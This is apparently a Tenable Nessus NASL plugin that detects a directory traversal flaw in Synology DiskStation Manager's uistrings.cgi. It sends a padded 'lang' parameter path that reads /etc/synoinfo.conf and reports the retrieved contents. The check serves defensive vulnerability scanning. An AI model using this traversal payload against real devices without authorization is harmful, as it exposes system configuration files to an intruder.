#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(72347);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/01/07 15:01:56 $");

  script_bugtraq_id(62310);
  script_osvdb_id(97171, 97173);
  script_xref(name:"EDB-ID", value:"28243");

  script_name(english:"Synology DiskStation Manager uistrings.cgi lang Parameter Directory Traversal");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis", value:
"The remote Synology DiskStation Manager is affected by a directory
traversal vulnerability.");
  script_set_attribute(
    attribute:"description",
    value:
"The Synology DiskStation Manager installed on the remote host is
affected by a directory traversal vulnerability.  By sending a large,
padded file path to the 'lang' parameter of the 'uistrings.cgi'
script, an overflow will occur within the snprintf function used to
prevent such attacks.  A remote, unauthenticated attacker could
leverage this vulnerability to view lines with an equal sign, notably
key/value pairs, in files.

Note that the affected uistrings.cgi script is located in both the
'/scripts/' and '/webfm/webUI/' web directories."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2013/Sep/53");
  script_set_attribute(attribute:"solution", value:"Upgrade to 4.3-3776 Update 2.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/09/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/09/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/02/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:synology:diskstation_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("synology_diskstation_manager_detect.nbin");
  script_require_keys("www/synology_dsm");
  script_require_ports("Services/www", 5000, 5001);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

port = get_http_port(default:5000, embedded:TRUE);

install = get_install_from_kb(appname:"synology_dsm", port:port, exit_on_fail:TRUE);

app = "Synology DiskStation Manager (DSM)";
dir = "scripts";
install_loc = build_url(port:port, qs:dir + "/");

# Check for attachment functionality
if (
  !defined_func("nasl_level") ||
  nasl_level() < 5200 ||
  COMMAND_LINE ||
  !isnull(get_preference("sc_version"))
) no_attachment_func = TRUE;

# Verify the file can be retrieved
file = "/etc/synoinfo.conf";

url = "uistrings.cgi?lang=.////////////////////////////////////////////////////////////////////////////////////////../../../../.." + file;

res = http_send_recv3(
    method    : "GET",
    item      : install_loc + url,
    port      : port,
    exit_on_fail : TRUE
);

if (("['company_title']=" >< res[2]) && ("['admin_port']" >< res[2]))
{
  if (report_verbosity > 0)
  {
    snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\n' + 'Nessus was able to exploit the issue to retrieve the contents of '+
      '\n' + 'a Synology configuration file (\'' + file + '\')' +
      '\n' + 'using the following request :' +
      '\n' +
      '\n' + install_loc + url +
      '\n' +
      '\n' + 'Note that this URL results in the key/value contents of the' +
      '\n' + 'configuration file being shown.' +
      '\n';

    if (report_verbosity > 1)
    {
      if (no_attachment_func)
      {
        report +=
          '\n' + 'This produced the following truncated output :' +
          '\n' + snip +
          '\n' + beginning_of_response(resp:res[2], max_lines:'30') +
          '\n' + snip +
          '\n';
        security_warning(port:port, extra:report);
      }
      else
      {
        report +=
          '\n' + 'Attached is a copy of the decoded response :' + '\n';

        attachments = make_list();
        attachments[0] = make_array();
        attachments[0]["type"] = "text/plain";
        attachments[0]["name"] = file;
        attachments[0]["value"] = res[2];
        security_report_with_attachments(
          port  : port,
          level : 2,
          extra : report,
          attachments : attachments
        );
      }
    }
    else security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_loc);
